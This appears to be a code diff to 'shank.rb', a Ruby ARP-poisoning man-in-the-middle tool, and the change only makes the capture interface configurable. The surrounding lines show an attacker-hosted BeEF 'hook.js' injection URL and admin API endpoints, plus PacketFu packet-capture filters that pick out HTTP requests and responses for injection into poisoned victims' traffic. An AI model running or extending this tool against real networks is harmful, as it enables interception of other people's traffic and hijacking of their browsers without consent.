@@ -35,6 +35,7 @@ ARP_TIMEOUT = 30
 @injection = "http://#{@beef_ip}:3000/hook.js"
 @beef_hooks = "http://#{@beef_ip}:3000/api/hooks"
 @beef_admin = "http://#{@beef_ip}:3000/api/admin"
+@interface = "eth0"
 
 optparse = OptionParser.new do |opts|
   opts.banner = "Usage: shank.rb [options] CIDR"	
@@ -146,7 +147,7 @@ class Shank
   attr_reader :ip, :ipr, :packetfu_conf, :arp_cache, :interface
   # @param [String] ip The ip address or range that you want to poison
   # @param [String] interface (eth0) The interface to poison through
-  def initialize(ip, interface = "eth0")
+  def initialize(ip, interface = @interface)
     @inject_queue = Queue.new
     @ip = IPAddr.new(ip)
     @ipr = @ip.to_range
@@ -318,14 +319,14 @@ end
 
 # The stuff below here could be cleaned up a bit more.
 
-shank = Shank.new(ARGV[0], (ARGV[1] || "eth0"))
+shank = Shank.new(ARGV[0], (ARGV[1] || @interface))
 @alive_ips = []
 
 
-arp_cap = PacketFu::Capture.new(:start => true, :filter => 
+arp_cap = PacketFu::Capture.new(:iface => @interface,:start => true, :filter => 
                                  "arp and not ether src " + shank.interface_ether)
 
-http_cap = PacketFu::Capture.new(:start => true, 
+http_cap = PacketFu::Capture.new(:iface => @interface,:start => true, 
                                   :filter => "(tcp[(tcp[12]>>2):4] = 0x47455420 "+
                                   "or tcp[(tcp[12]>>2):4] = 0x48545450) and "+
                                   "port 80 and ether dst " + 
@@ -333,7 +334,7 @@ http_cap = PacketFu::Capture.new(:start => true,
                                   " and not ether src " + 
                                   shank.interface_ether)
 
-tcp_cap = PacketFu::Capture.new(:start => true, 
+tcp_cap = PacketFu::Capture.new(:iface => @interface,:start => true, 
                                  :filter => 
                                 "(tcp and not port 80) or "+
                                 "(port 80 and (len <= ((ip[0]&0x0f)*4 + (tcp[12]>>2) + 20))) "+
@@ -341,7 +342,7 @@ tcp_cap = PacketFu::Capture.new(:start => true,
   "tcp[(tcp[12]>>2):4] != 0x48545450)) and ether dst " + 
   shank.interface_ether + " and not ether src " + shank.interface_ether)
 
-fw_cap = PacketFu::Capture.new(:start => true, 
+fw_cap = PacketFu::Capture.new(:iface => @interface,:start => true, 
                                 :filter => "(udp or icmp) and ether dst " + 
                                 shank.interface_ether + 
                                 " and not ether src " + shank.interface_ether)
